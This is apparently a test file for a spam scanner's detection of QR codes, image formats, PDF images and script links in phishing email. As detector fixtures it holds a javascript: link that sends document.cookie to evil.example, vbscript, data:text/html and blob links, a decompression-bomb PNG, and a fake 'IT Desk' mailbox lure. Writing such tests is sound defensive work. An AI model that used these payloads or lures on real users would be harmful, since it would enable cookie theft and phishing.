import assert from 'node:assert/strict';
import {Buffer} from 'node:buffer';
import {readFileSync} from 'node:fs';
import {describe, it} from 'node:test';
import {deflateSync} from 'node:zlib';
import SpamScanner from '../src/index.js';
import {
	MAX_PIXELS, decodeImage, grayOf, pdfImages,
} from '../src/image.js';
import {
	correctBlock, decodeQr, drawnQrImages, qrCodesOf, qrSources, readMatrix,
} from '../src/qr.js';
import {scriptLinks} from '../src/tokenizer.js';
import {cpuTime} from './helpers/cpu-time.js';
import {
	byteSegment, encodeGif, encodePng, encodeQr, pdf, render,
} from './helpers/images.js';
import {message} from './helpers/index.js';

const URL = 'https://qr-login.example/mailbox';
// (a script's scheme, written so that no address here is one)
const js = 'javascript';
const JS = 'JavaScript';
const fixture = name => readFileSync(new globalThis.URL(`fixtures/qr/${name}`, import.meta.url));
const code = (options = {}) => encodeQr(URL, {version: 3, ...options});
const names = result => result.tests.map(test => test.name);

describe('QR codes', () => {
	it('reads every level of error correction and mask, and versions with alignment patterns, version information and longer counts', () => {
		for (const level of ['L', 'M', 'Q', 'H']) {
			for (let mask = 0; mask < 8; mask++) {
				assert.equal(readMatrix(code({version: 4, level, mask})), URL, `${level} ${mask}`);
			}
		}

		for (const [version, text] of [[1, 'https://a.example'], [7, `${URL}/${'x'.repeat(100)}`], [10, `${URL}/${'x'.repeat(200)}`], [27, `${URL}/${'x'.repeat(900)}`]]) {
			assert.equal(readMatrix(encodeQr(text, {version, level: 'L'})), text, String(version));
		}
	});

	it('reads digits, letters, bytes and kanji, past ECI designators, structured append and FNC1', () => {
		const read = bits => readMatrix(encodeQr(null, {version: 3, level: 'L', bits}));
		// (digits in threes, and two or one left)
		assert.equal(read([[0b0001, 4], [8, 10], [123, 10], [456, 10], [78, 7]]), '12345678');
		assert.equal(read([[0b0001, 4], [4, 10], [123, 10], [4, 4]]), '1234');
		// (letters in twos, and one left)
		assert.equal(read([[0b0010, 4], [3, 9], [(10 * 45) + 11, 11], [36, 6]]), 'AB ');
		// (kanji, in Shift JIS)
		assert.equal(read([[0b1000, 4], [2, 8], [0x0D_9F, 13], [0x1A_AA, 13]]), '点茗');
		// (ECI of one, two and three bytes, structured append, FNC1 in either
		//  position, then bytes)
		assert.equal(read([[0b0111, 4], [26, 8], [0b0111, 4], [0x80_1A, 16], [0b0111, 4], [0xC0_00_1A, 24], [0b0011, 4], [0x01_00, 16], [0b0101, 4], [0b1001, 4], [65, 8], ...byteSegment('évil', 3)]), 'évil');
		// (one segment after another, and no terminator where the data is full)
		assert.equal(read([...byteSegment('ab', 3), [0b0001, 4], [2, 10], [42, 7]]), 'ab42');
		assert.equal(readMatrix(encodeQr('x'.repeat(53), {version: 3, level: 'L'})), 'x'.repeat(53));
		// (not a mode that is none, or a segment longer than the data)
		assert.equal(read([[0b1111, 4]]), null);
		assert.equal(read([[0b0100, 4], [200, 8], [65, 8]]), null);
		assert.equal(read([[0b1000, 4], [200, 8], [1, 13]]), null);
	});

	it('corrects errors as far as its error correction does, and no further', () => {
		const grid = encodeQr(URL, {version: 4, level: 'H'});
		const damaged = grid.map(row => [...row]);
		for (let row = 12; row < 22; row += 3) {
			for (let column = 12; column < 16; column++) {
				damaged[row][column] ^= 1;
			}
		}

		assert.equal(readMatrix(damaged), URL);
		const ruined = grid.map((row, r) => row.map((value, c) => (r > 9 && c > 9 ? 1 - value : value)));
		assert.equal(readMatrix(ruined), null);
		// (a block's codewords, and ones changed)
		const block = [32, 91, 11, 120, 209, 114, 220, 77, 67, 64, 236, 17, 236, 17, 236, 17];
		assert.equal(correctBlock([...block], 6), false);
		// (a size that is no QR code's, or a format beyond three bits off)
		assert.equal(readMatrix(Array.from({length: 22}, () => Array.from({length: 22}, () => 0))), null);
		const unformatted = grid.map(row => [...row]);
		for (const [row, column] of [[8, 0], [8, 1], [8, 2], [8, 3], [0, 8], [1, 8], [2, 8], [3, 8]]) {
			unformatted[row][column] ^= 1;
		}

		for (let i = 0; i < 8; i++) {
			unformatted[grid.length - 1 - i][8] ^= 1;
			unformatted[8][grid.length - 1 - i] ^= 1;
		}

		assert.equal(readMatrix(unformatted), null);
	});

	it('reads the largest versions, whose alignment patterns are spaced apart differently', () => {
		const text = `${URL}/${'v'.repeat(1300)}`;
		assert.equal(readMatrix(encodeQr(text, {version: 32, level: 'L'})), text);
	});

	it('finds one of two QR codes of other sizes in one image', () => {
		const small = render(code(), {scale: 2});
		const large = render(encodeQr('https://other.example/', {version: 2}), {scale: 6});
		const width = small.width + large.width;
		const gray = new Uint8Array(width * large.height).fill(255);
		for (let y = 0; y < large.height; y++) {
			gray.set(large.gray.subarray(y * large.width, (y + 1) * large.width), y * width);
			if (y < small.height) {
				gray.set(small.gray.subarray(y * small.width, (y + 1) * small.width), (y * width) + large.width);
			}
		}

		assert.ok([URL, 'https://other.example/'].includes(decodeQr({width, height: large.height, gray})));
	});

	it('finds a QR code in an image, of any size of module, turned, mirrored or light on dark', () => {
		for (const scale of [1, 2, 3, 7]) {
			for (const turns of [0, 1, 2, 3]) {
				assert.equal(decodeQr(render(code(), {scale, turns})), URL, `${scale} ${turns}`);
			}
		}

		assert.equal(decodeQr(render(code(), {invert: true})), URL);
		assert.equal(decodeQr(render(code(), {mirror: true})), URL);
		assert.equal(decodeQr(render(code(), {margin: 0, scale: 3})), URL);
		assert.equal(decodeQr(render(encodeQr(`${URL}/${'y'.repeat(300)}`, {version: 15, level: 'L'}), {scale: 2})), `${URL}/${'y'.repeat(300)}`);
		// (nothing in an image without one)
		assert.equal(decodeQr({width: 100, height: 100, gray: new Uint8Array(10_000).fill(255)}), null);
		const noise = new Uint8Array(200 * 200);
		for (let i = 0; i < noise.length; i++) {
			noise[i] = (i * 7919) % 251;
		}

		assert.equal(decodeQr({width: 200, height: 200, gray: noise}), null);
		// (three finder patterns, but no QR code between them)
		const finders = render(code(), {scale: 3});
		for (let y = 40; y < finders.height - 40; y++) {
			finders.gray.fill(255, (y * finders.width) + 40, (y * finders.width) + finders.width - 40);
		}

		assert.equal(decodeQr(finders), null);
		for (const image of [{width: 10, height: 10, gray: new Uint8Array(100)}, {width: 30, height: 30, gray: new Uint8Array(10)}, {width: 1.5, height: 30}]) {
			assert.equal(decodeQr(image), null);
		}
	});
});

describe('images', () => {
	const image = render(code(), {scale: 3});

	it('reads PNG of every color type and depth, filter and interlacing', () => {
		for (const [color, depths] of [[0, [1, 2, 4, 8, 16]], [2, [8, 16]], [3, [1, 2, 4, 8]], [4, [8, 16]], [6, [8, 16]]]) {
			for (const depth of depths) {
				for (const interlaced of [false, true]) {
					const decoded = decodeImage(encodePng(image, {color, depth, interlaced}));
					assert.equal(decodeQr(decoded), URL, `${color} ${depth} ${interlaced}`);
				}
			}
		}

		// (transparent, over white)
		for (const color of [3, 4, 6]) {
			assert.equal(decodeQr(decodeImage(encodePng(image, {color, transparent: true}))), URL, String(color));
		}
	});

	it('reads GIF, interlaced or not, with a global or local table and transparency', () => {
		for (const options of [{}, {interlaced: true}, {local: true}, {transparent: true}]) {
			assert.equal(decodeQr(decodeImage(encodeGif(image, options))), URL, JSON.stringify(options));
		}

		// (a long one, whose codes fill the table and clear it)
		const large = render(encodeQr(`${URL}/${'z'.repeat(200)}`, {version: 10, level: 'L'}), {scale: 5});
		assert.equal(decodeQr(decodeImage(encodeGif(large))), `${URL}/${'z'.repeat(200)}`);
	});

	it('reads baseline JPEG, of one or three components, any sampling, restart markers and 16-bit tables, and no other kind', () => {
		for (const name of ['color.jpg', 'gray-restart.jpg', 'full-restart.jpg', 'sixteen.jpg']) {
			assert.equal(decodeQr(decodeImage(fixture(name))), URL, name);
		}

		for (const name of ['progressive.jpg', 'cmyk.jpg', 'code.webp']) {
			assert.equal(decodeImage(fixture(name)), null, name);
		}

		// (12 bits, no frame before its scan, a scan's tables missing)
		const jpeg = fixture('color.jpg');
		const frame = jpeg.indexOf(Buffer.from([0xFF, 0xC0]));
		const twelve = Buffer.from(jpeg);
		twelve[frame + 4] = 12;
		assert.equal(decodeImage(twelve), null);
		const scan = jpeg.indexOf(Buffer.from([0xFF, 0xDA]));
		assert.equal(decodeImage(Buffer.concat([jpeg.subarray(0, frame), jpeg.subarray(scan)])), null);
		const noTables = Buffer.from(jpeg);
		for (let i = jpeg.indexOf(Buffer.from([0xFF, 0xC4])); i !== -1; i = jpeg.indexOf(Buffer.from([0xFF, 0xC4]), i + 2)) {
			noTables[i + 1] = 0xFE;
		}

		assert.equal(decodeImage(noTables), null);
		// (an end before a scan, and padding between markers)
		assert.equal(decodeImage(Buffer.concat([jpeg.subarray(0, scan), Buffer.from([0xFF, 0xD9, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0])])), null);
		assert.equal(decodeQr(decodeImage(Buffer.concat([jpeg.subarray(0, 2), Buffer.from([0x00, 0xFF]), jpeg.subarray(2)]))), URL);
	});

	it('reads no image bigger than its pixels allow, nor one that inflates past its size, in no time', () => {
		const start = cpuTime();
		const huge = encodePng({width: 3000, height: 2000, gray: new Uint8Array(6_000_000).fill(255)});
		assert.equal(decodeImage(huge), null);
		assert.equal(decodeImage(encodePng(image), {maxPixels: 100}), null);
		const bomb = Buffer.from(encodePng(image));
		const idat = bomb.indexOf('IDAT');
		const inflated = Buffer.concat([bomb.subarray(0, idat - 4), Buffer.alloc(4), Buffer.from('IDAT'), deflateSync(Buffer.alloc(50_000_000)), Buffer.alloc(4), bomb.subarray(bomb.indexOf('IEND') - 4)]);
		inflated.writeUInt32BE(inflated.indexOf('IEND') - idat - 8, idat - 4);
		assert.equal(decodeImage(inflated), null);
		const gif = encodeGif(image);
		const wide = Buffer.from(gif);
		wide.writeUInt16LE(5000, 6);
		wide.writeUInt16LE(5000, 8);
		assert.equal(decodeImage(wide), null);
		const jpeg = Buffer.from(fixture('color.jpg'));
		const frame = jpeg.indexOf(Buffer.from([0xFF, 0xC0]));
		jpeg.writeUInt16BE(5000, frame + 5);
		jpeg.writeUInt16BE(5000, frame + 7);
		assert.equal(decodeImage(jpeg), null);
		assert.ok(cpuTime() - start < 2000);
		assert.ok(MAX_PIXELS >= 1500 * 1500);
	});

	it('reads nothing of a damaged or cut image, nor of what is none', () => {
		const png = encodePng(image);
		const gif = encodeGif(image);
		for (const buffer of [png.subarray(0, 40), gif.subarray(0, 30), Buffer.from('not an image at all'), Buffer.alloc(8), 'text']) {
			const decoded = decodeImage(buffer);
			assert.ok(decoded === null || decodeQr(decoded) === null);
		}

		// (a PNG of no color type, depth or size it can have)
		for (const [offset, value] of [[25, 5], [24, 3], [16, 0]]) {
			const bad = Buffer.from(png);
			bad.writeUInt8(value, offset);
			if (offset === 16) {
				bad.writeUInt32BE(0, 16);
			}

			assert.equal(decodeImage(bad), null, String(offset));
		}

		// (a GIF of no image, of another block, of no table or of codes past its table)
		assert.equal(decodeImage(Buffer.concat([gif.subarray(0, gif.indexOf(0x2C, 13)), Buffer.from([0x3B])])), null);
		assert.equal(decodeImage(Buffer.concat([gif.subarray(0, 25), Buffer.from([0x99, 0, 0, 0])])), null);
		const noTable = encodeGif(image, {local: true});
		const descriptor = noTable.lastIndexOf(0x2C, noTable.length - 100);
		const stripped = Buffer.from(noTable);
		stripped[descriptor + 9] = 0;
		assert.ok(decodeQr(decodeImage(stripped) ?? {}) === null);
		const garbled = Buffer.from(gif);
		const data = garbled.indexOf(Buffer.from([0x2C])) + 10 + 13;
		garbled.fill(0xFF, data + 2, data + 40);
		assert.ok(decodeQr(decodeImage(garbled) ?? {}) === null);
	});

	it('reads the edges of PNG, GIF and JPEG: empty passes, short palettes, real compression, stray markers and cut or damaged data', () => {
		// (an image too small for every pass of interlacing, and palettes too short
		//  or missing, whose colors are white)
		assert.equal(decodeImage(encodePng({width: 2, height: 2, gray: new Uint8Array([0, 255, 255, 0])}, {interlaced: true})).width, 2);
		assert.equal(decodeQr(decodeImage(encodePng(image, {color: 3, palette: Buffer.from([0, 0, 0])}))), URL);
		assert.ok(decodeImage(encodePng(image, {color: 3, palette: null})).gray.every(value => value === 255));
		// (GIF compressed as a program compresses it, and one of fewer codes than
		//  pixels)
		assert.equal(decodeQr(decodeImage(fixture('code.gif'))), URL);
		const short = Buffer.from(encodeGif(image));
		short.writeUInt16LE(image.height + 10, 8);
		short.writeUInt16LE(image.height + 10, short.indexOf(0x2C, 13) + 7);
		assert.equal(decodeImage(short).height, image.height + 10);
		// (JPEG: fill bytes, cut before its scan or in a segment, data cut short,
		//  damaged, restarts it has no markers for, and long runs of zeros)
		const jpeg = fixture('color.jpg');
		const scan = jpeg.indexOf(Buffer.from([0xFF, 0xDA]));
		const frame = jpeg.indexOf(Buffer.from([0xFF, 0xC0]));
		assert.equal(decodeQr(decodeImage(Buffer.concat([jpeg.subarray(0, frame), Buffer.from([0xFF]), jpeg.subarray(frame)]))), URL);
		assert.equal(decodeImage(jpeg.subarray(0, scan)), null);
		assert.equal(decodeImage(jpeg.subarray(0, frame + 8)), null);
		assert.equal(decodeImage(Buffer.concat([jpeg.subarray(0, scan + 400), Buffer.from([0xFF, 0xD9])])).width, 111);
		const damaged = Buffer.from(jpeg);
		damaged.fill(0xFE, scan + 20, scan + 2000);
		assert.equal(decodeImage(damaged).width, 111);
		const restarts = Buffer.concat([jpeg.subarray(0, scan), Buffer.from([0xFF, 0xDD, 0, 4, 0, 2]), jpeg.subarray(scan)]);
		assert.equal(decodeImage(restarts).width, 111);
		assert.equal(decodeImage(fixture('stripes.jpg')).width, 32);
		assert.equal(decodeQr(decodeImage(Buffer.concat([jpeg.subarray(0, frame), Buffer.from([0xFF, 0xD0]), jpeg.subarray(frame)]))), URL);
	});

	it('reads the pixels an image decoder outside gives, of any channels, and none that are not', () => {
		const gray = new Uint8Array([0, 255, 0, 255]);
		assert.deepEqual([...grayOf({
			width: 2, height: 2, data: gray, channels: 1,
		}).gray], [0, 255, 0, 255]);
		assert.deepEqual([...grayOf({
			width: 1, height: 1, data: new Uint8Array([0, 0]), channels: 2,
		}).gray], [255]);
		assert.deepEqual([...grayOf({
			width: 1, height: 1, data: new Uint8Array([255, 0, 0]), channels: 3,
		}).gray], [76]);
		assert.deepEqual([...grayOf({
			width: 1, height: 1, data: new Uint8Array([0, 0, 0, 255]), channels: 4,
		}).gray], [0]);
		for (const bad of [{}, {
			width: 1, height: 1, data: new Uint8Array(1), channels: 5,
		}, {
			width: 2, height: 2, data: new Uint8Array(1), channels: 1,
		}, {
			width: 0, height: 1, data: new Uint8Array(1), channels: 1,
		}, undefined]) {
			assert.equal(grayOf(bad), null);
		}
	});

	it('reads the images of PDF files, and the QR codes their pages draw', () => {
		const {width, gray} = image;
		const rowBytes = Math.ceil(width / 8);
		const mask = Buffer.alloc(rowBytes * width, 0xFF);
		const inverse = Buffer.alloc(rowBytes * width, 0);
		const predicted = Buffer.alloc((width + 1) * width);
		const rgb = Buffer.alloc(width * width * 3);
		const cmyk = Buffer.alloc(width * width * 4);
		for (let y = 0; y < width; y++) {
			predicted[y * (width + 1)] = 2;
			for (let x = 0; x < width; x++) {
				const dark = gray[(y * width) + x] === 0;
				if (dark) {
					mask[(y * rowBytes) + (x >> 3)] &= ~(0x80 >> (x & 7));
					inverse[(y * rowBytes) + (x >> 3)] |= 0x80 >> (x & 7);
				}

				predicted[(y * (width + 1)) + 1 + x] = (gray[(y * width) + x] - (y ? gray[((y - 1) * width) + x] : 0)) & 0xFF;
				rgb.fill(gray[(y * width) + x], ((y * width) + x) * 3, (((y * width) + x) * 3) + 3);
				cmyk[(((y * width) + x) * 4) + 3] = 255 - gray[(y * width) + x];
			}
		}

		const grid = code();
		let squares = '1 g\n0 0 500 500 re f\n0 g\n';
		for (const [r, row] of grid.entries()) {
			for (const [c, dark] of row.entries()) {
				if (dark) {
					squares += `${100 + (c * 2.5)} ${700 - (r * 2.5)} 2.5 -2.5 re\n`;
				}
			}
		}

		squares += 'f\n';

		const image_ = `/Type /XObject /Subtype /Image /Width ${width} /Height ${width}`;
		const read = (...streams) => pdfImages(pdf(streams)).map(found => decodeQr(found));
		assert.deepEqual(read([`${image_} /ColorSpace /DeviceRGB /BitsPerComponent 8 /Filter /DCTDecode`, fixture('color.jpg')]), [URL]);
		assert.deepEqual(read([`${image_} /ColorSpace /DeviceGray /BitsPerComponent 8 /Filter /FlateDecode`, deflateSync(Buffer.from(gray))]), [URL]);
		assert.deepEqual(read([`${image_} /ColorSpace /DeviceGray /BitsPerComponent 8 /Filter /FlateDecode /DecodeParms << /Predictor 15 /Columns ${width} >>`, deflateSync(predicted)]), [URL]);
		assert.deepEqual(read([`${image_} /ImageMask true /Filter /FlateDecode`, deflateSync(mask)], [`${image_} /ImageMask true /Decode [1 0]`, inverse]), [URL, URL]);
		assert.deepEqual(read([`${image_} /ColorSpace /DeviceRGB /BitsPerComponent 8`, rgb], [`${image_} /ColorSpace /DeviceCMYK /BitsPerComponent 8`, cmyk]), [URL, URL]);
		assert.deepEqual(read(['/Filter /FlateDecode', deflateSync(Buffer.from(squares))], ['', Buffer.from(squares.replace('0 g', '0 0 0 rg').replace('f\n0 0 0 rg', 'f\n0 0 0 1 k').replaceAll(' re\n', ' re f\n'))]), [URL, URL]);
		// (not what it cannot read: a filter or color space it has not, too
		//  big, encrypted, or of too few squares; nor streams it has no need of)
		assert.deepEqual(read(
			[`${image_} /ColorSpace /DeviceGray /BitsPerComponent 8 /Filter /JBIG2Decode`, Buffer.alloc(10)],
			[`${image_} /ColorSpace [/Indexed /DeviceRGB 1 <000000ffffff>] /BitsPerComponent 8`, Buffer.alloc(10)],
			[`${image_} /ColorSpace /DeviceGray /BitsPerComponent 16`, Buffer.alloc(10)],
			[`${image_} /ColorSpace /DeviceGray /BitsPerComponent 8 /Filter [/FlateDecode /DCTDecode]`, Buffer.alloc(10)],
			[`${image_} /ColorSpace /DeviceGray /BitsPerComponent 8 /Filter /FlateDecode`, Buffer.from('not deflated')],
			['/Type /XObject /Subtype /Image /Width 50000 /Height 50000 /BitsPerComponent 8', Buffer.alloc(10)],
			['/Type /XRef /Filter /FlateDecode', deflateSync(Buffer.from(squares))],
			['/Filter /FlateDecode', Buffer.from('not deflated')],
			['', Buffer.from('0 g 1 1 2 2 re f 0 0 1 1 re S 10 10 2 2 re n')],
		), []);
		assert.deepEqual(pdfImages(Buffer.concat([pdf([['', Buffer.from(squares)]]), Buffer.from('/Encrypt 2 0 R')])), []);
		assert.deepEqual(pdfImages('a PDF'), []);
		assert.deepEqual(pdfImages(Buffer.from('%PDF-1.4\n1 0 obj << >> stream\nno end')), []);
		// (8 bits when no depth is given; operators without their operands, long
		//  runs of numbers, a stray "endstream", and more squares than are read)
		assert.deepEqual(read([`${image_} /ColorSpace /DeviceGray /Filter /FlateDecode`, deflateSync(Buffer.from(gray))]), [URL]);
		assert.deepEqual(read(['', Buffer.from(`1 rg 2 k g 1 2 3 4 5 6 7 8 9 re ${squares.replace('\n0 g', '\n0 0 0 rg')}`)]), [URL]);
		assert.deepEqual(pdfImages(Buffer.concat([Buffer.from('%PDF-1.4\nendstream\n'), pdf([['', Buffer.from(squares)]]).subarray(9)])).map(found => decodeQr(found)), [URL]);
		assert.deepEqual(read(['', Buffer.from(`0 g ${'0 0 1 1 re '.repeat(40_002)}f`)]), []);
		// (at most so many images, and no squares over a module's size limit)
		assert.equal(pdfImages(pdf(Array.from({length: 4}, () => ['', Buffer.from(squares)])), {maxImages: 2}).length, 2);
		assert.deepEqual(read(['', Buffer.from(squares.replaceAll('2.5', '0.01'))]), []);
	});
});

describe('QR codes of a message', () => {
	const png = encodePng(render(code(), {scale: 3}));

	it('reads its images and PDF files, and the images its HTML holds, at most ten of each', () => {
		const attachments = [{content: png}, {content: pdf([['/Filter /FlateDecode', deflateSync(Buffer.from('q Q'))]])}, {content: 'not a buffer'}, {content: Buffer.from('plain text')}];
		const html = `<img src="data:image/png;base64,${png.toString('base64').replaceAll(/(.{76})/g, '$1\n')}"><img src="data:image/png,${png}"><img src="data:image/jpeg;base64,bm90IGFuIGltYWdl"><img src="data:image/${'x'.repeat(100)},"><img src="data:image/`;
		const {images, pdfs} = qrSources(attachments, html);
		assert.equal(images.length, 2);
		assert.equal(pdfs.length, 1);
		assert.equal(qrSources(Array.from({length: 12}, () => ({content: png})), '').images.length, 10);
		assert.deepEqual(qrSources(null, null), {images: [], pdfs: []});
		// (by their first bytes: GIF, JPEG and WebP, not a few bytes)
		const kinds = qrSources([{content: fixture('code.gif')}, {content: fixture('color.jpg')}, {content: fixture('code.webp')}, {content: Buffer.from('GIF8')}], '');
		assert.equal(kinds.images.length, 3);
	});

	it('reads each of them once, within its limits of images, pixels and time', async () => {
		assert.deepEqual(await qrCodesOf({images: [png, png], pdfs: [pdf([['/Filter /FlateDecode', deflateSync(Buffer.from('q Q'))]])]}), [URL]);
		const {width, gray} = render(encodeQr('https://in-a-pdf.example/', {version: 2}), {scale: 3});
		const inPdf = pdf([[`/Type /XObject /Subtype /Image /Width ${width} /Height ${width} /ColorSpace /DeviceGray /BitsPerComponent 8 /Filter /FlateDecode`, deflateSync(Buffer.from(gray))]]);
		assert.deepEqual(await qrCodesOf({pdfs: [inPdf]}), ['https://in-a-pdf.example/']);
		assert.deepEqual(await qrCodesOf({images: [png]}, {deadline: Date.now() - 1}), []);
		assert.deepEqual(await qrCodesOf(), []);
		// (more pixels than it reads in all)
		const big = {width: 1500, height: 2000, gray: new Uint8Array(3_000_000).fill(255)};
		assert.deepEqual(await qrCodesOf({drawn: [big, big, render(code())]}), []);
		// (but a smaller one after one that does not fit)
		assert.deepEqual(await qrCodesOf({drawn: [big, {...big, width: 2000, height: 2000}, render(code())]}), [URL]);
		const many = Array.from({length: 11}, () => render(code(), {scale: 1}));
		assert.deepEqual(await qrCodesOf({drawn: many}), [URL]);
		// (no PDF file read past the images it reads at most)
		const other = pdf([['/Filter /FlateDecode', deflateSync(Buffer.from('q Q'))]]);
		assert.deepEqual(await qrCodesOf({drawn: many.slice(0, 10), pdfs: [other]}), [URL]);
	});

	it('reads what it cannot itself with an image decoder outside, in time, and nothing it fails on', async () => {
		const webp = fixture('code.webp');
		const pixels = render(code(), {scale: 3});
		const decode = async () => ({
			width: pixels.width, height: pixels.height, data: pixels.gray, channels: 1,
		});
		assert.deepEqual(await qrCodesOf({images: [webp]}, {decode}), [URL]);
		assert.deepEqual(await qrCodesOf({images: [webp]}), []);
		assert.deepEqual(await qrCodesOf({images: [webp]}, {
			async decode() {
				throw new Error('cannot read');
			},
		}), []);
		assert.deepEqual(await qrCodesOf({images: [webp]}, {decode: async () => null}), []);
		const slow = () => new Promise(resolve => {
			setTimeout(resolve, 200, {
				width: pixels.width, height: pixels.height, data: pixels.gray, channels: 1,
			});
		});
		assert.deepEqual(await qrCodesOf({images: [webp]}, {decode: slow, deadline: Date.now() + 20}), []);
	});

	it('reads a QR code drawn with table cells or block characters', () => {
		const grid = code();
		const color = dark => (dark ? '#000000' : '#ffffff');
		const table = (cell, rows = grid) => `<table>${rows.map(row => `<tr>${row.map(dark => cell(dark)).join('')}</tr>`).join('')}</table>`;
		for (const cell of [dark => `<td width="4" height="4" bgcolor="${color(dark)}"></td>`, dark => `<td style="width:4px;height:4px;background-color:${dark ? 'black' : 'white'}"></td>`, dark => `<td width=4 bgcolor=${dark ? '#000' : '#fff'}></td>`, dark => `<td style="background:rgb(${dark ? '0,0,0' : '255, 255, 255'});width:3px"></td>`]) {
			const [image] = drawnQrImages(`<p>Scan</p>${table(cell)}<table><tr><td>after</td></tr></table>`, []);
			assert.equal(decodeQr(image), URL);
		}

		// (rows of other lengths before it, a table never closed, and no grid)
		assert.equal(decodeQr(drawnQrImages(`<table><tr>${'<td>x</td>'.repeat(30)}</tr></table>${table(dark => `<td width="4" bgcolor="${color(dark)}"></td>`)}`, [])[0]), URL);
		assert.deepEqual(drawnQrImages(`${'<tr><td width=4 bgcolor=#000>'.repeat(300)}<td`, []).length, 0);
		assert.deepEqual(drawnQrImages('<table><tr><td>x</td></tr></table>'.repeat(500), []), []);
		// (with half blocks, a module wide and two high, or full blocks, two wide)
		const halves = [];
		for (let r = 0; r < grid.length + 8; r += 2) {
			const top = grid[r - 4] ?? [];
			const bottom = grid[r - 3] ?? [];
			halves.push(Array.from({length: grid.length + 8}, (_, c) => {
				const a = top[c - 4] ?? 0;
				const b = bottom[c - 4] ?? 0;
				if (a && b) {
					return '\u2588';
				}

				if (a || b) {
					return a ? '\u2580' : '\u2584';
				}

				return ' ';
			}).join(''));
		}

		assert.ok(drawnQrImages('', [halves.join('\n')]).some(image => decodeQr(image) === URL));
		const full = grid.map(row => row.map(dark => (dark ? '██' : '  ')).join('')).join('\n');
		assert.ok(drawnQrImages('', ['', `Scan:\n${full}`]).some(image => decodeQr(image) === URL));
		assert.deepEqual(drawnQrImages(null, [null, 'no blocks']), []);
		// (two images of each text of blocks, of at most two texts)
		assert.equal(drawnQrImages('', [full, full, full]).length, 4);
	});

	it('finds links that run a script or open a page held in them, not those that do nothing', () => {
		const found = href => scriptLinks(`<a href="${href}">Open</a>`).length;
		for (const href of [`${js}:void(0)`, `${js}:;`, `${js}:`, `${JS}: window.print()`, `${js}:history.back();`, `${js}:history.go(-1)`, `${js}:window.close()`, `${js}:return false`, 'data:image/png;base64,AAAA', 'https://example.com/', 'file://server/share']) {
			assert.equal(found(href), 0, href);
		}

		for (const href of [`${js}:location='https://evil.example/'`, 'vbscript:msgbox(1)', 'blob:https://evil.example/1', 'data:text/html;base64,PHNjcmlwdD4=', 'DATA:image/svg+xml,<svg>', ` ${js}:void(0);document.write(1)`]) {
			assert.equal(found(href), 1, href);
		}

		assert.equal(scriptLinks(`${'<a href="vbscript:x">x</a>'.repeat(20)}`).length, 10);
		assert.deepEqual(scriptLinks(null), []);
		assert.deepEqual(scriptLinks('<a href="https://example.com/">no script</a>'), []);
		const start = cpuTime();
		found(`${js}:${'void(0) '.repeat(20_000)}x`);
		assert.ok(cpuTime() - start < 500);
	});
});

describe('QR codes and script links in a scan', () => {
	const scanner = new SpamScanner({classifier: false, phishing: {cloudflare: false}});
	const png = encodePng(render(code(), {scale: 3}));
	const head = from => `From: IT Desk <${from}>\r\nTo: jane@customer.example\r\nSubject: Keep your mailbox\r\nDate: Fri, 20 Nov 2026 10:00:00 +0000\r\nMessage-ID: <qr@desk.example>\r\nMIME-Version: 1.0\r\n`;
	const withImage = (from = 'it@notice-center.example', image = png, type = 'image/png') => `${head(from)}Content-Type: multipart/mixed; boundary="b"\r\n\r\n--b\r\nContent-Type: text/plain\r\n\r\nScan the code with your phone to keep your mailbox.\r\n--b\r\nContent-Type: ${type}; name="code"\r\nContent-Transfer-Encoding: base64\r\n\r\n${image.toString('base64')}\r\n--b--\r\n`;
	const passed = domain => ({authenticationResults: {dmarc: {status: {result: 'pass'}, domain}}});

	it('checks the links of its QR codes, and counts one that goes elsewhere than the sender\'s own domains', async () => {
		const result = await scanner.scan(withImage());
		assert.ok(names(result).includes('QR_CODE_LINK'));
		assert.deepEqual(result.results.qrCodes, [URL]);
		assert.equal(result.links[0], URL);
		// (in the HTML too, and drawn without an image)
		const inline = `${head('it@notice-center.example')}Content-Type: text/html\r\n\r\n<p>Scan</p><img src="data:image/png;base64,${png.toString('base64')}">`;
		assert.ok(names(await scanner.scan(inline)).includes('QR_CODE_LINK'));
		// (also past as much of the HTML as the classifier reads)
		const padded = inline.replace('<p>Scan</p>', `<p>Scan</p><!--${'x'.repeat(300_000)}-->`);
		assert.ok(names(await scanner.scan(padded)).includes('QR_CODE_LINK'));
		const table = code().map(row => `<tr>${row.map(dark => `<td width="4" height="4" bgcolor="${dark ? '#000' : '#fff'}"></td>`).join('')}</tr>`).join('');
		const drawn = await scanner.scan(`${head('it@notice-center.example')}Content-Type: text/html\r\n\r\n<p>Scan</p><table>${table}</table>`);
		assert.ok(names(drawn).includes('QR_CODE_LINK') && names(drawn).includes('DRAWN_QR_CODE'));
		// (not of a sender whose From address is genuine: one that passes DMARC
		//  or signed in to send it, as a shop's QR code to its app; its link is
		//  checked all the same)
		assert.ok(!names(await scanner.scan(withImage(), passed('notice-center.example'))).includes('QR_CODE_LINK'));
		assert.equal((await scanner.scan(withImage(), passed('notice-center.example'))).links[0], URL);
		assert.ok(!names(await scanner.scan(withImage(), {phishing: {authenticatedSender: true}})).includes('QR_CODE_LINK'));
		assert.ok(names(await scanner.scan(withImage('it@qr-login.example'))).includes('QR_CODE_LINK'));
		const off = await scanner.scan(withImage(), {qrCodes: false});
		assert.ok(!names(off).includes('QR_CODE_LINK'));
		assert.deepEqual(off.results.qrCodes, []);
		// (a QR code of no link)
		const wifi = encodePng(render(encodeQr('WIFI:S:Office;T:WPA;P:secret;;', {version: 3}), {scale: 3}));
		const plain = await scanner.scan(withImage(undefined, wifi));
		assert.deepEqual(plain.results.qrCodes, ['WIFI:S:Office;T:WPA;P:secret;;']);
		assert.ok(!names(plain).includes('QR_CODE_LINK'));
	});

	it('reads an image it does not with the decodeImage option', async () => {
		const pixels = render(code(), {scale: 3});
		const decodeImage = async () => ({
			width: pixels.width, height: pixels.height, data: pixels.gray, channels: 1,
		});
		const webp = withImage(undefined, fixture('code.webp'), 'image/webp');
		assert.ok(!names(await scanner.scan(webp)).includes('QR_CODE_LINK'));
		assert.ok(names(await scanner.scan(webp, {decodeImage})).includes('QR_CODE_LINK'));
	});

	it('counts a link that runs a script or opens a page held in it, from any sender', async () => {
		const html = `${head('it@notice-center.example')}Content-Type: text/html\r\n\r\n<a href="${js}:location='https://evil.example/'+document.cookie">https://www.paypal.com/</a> <a href="vbscript:x"></a>`;
		const result = await scanner.scan(html);
		assert.ok(names(result).includes('SCRIPT_LINK'));
		assert.match(result.tests.find(test => test.name === 'SCRIPT_LINK').description, /showing "https:\/\/www\.paypal\.com\/"/);
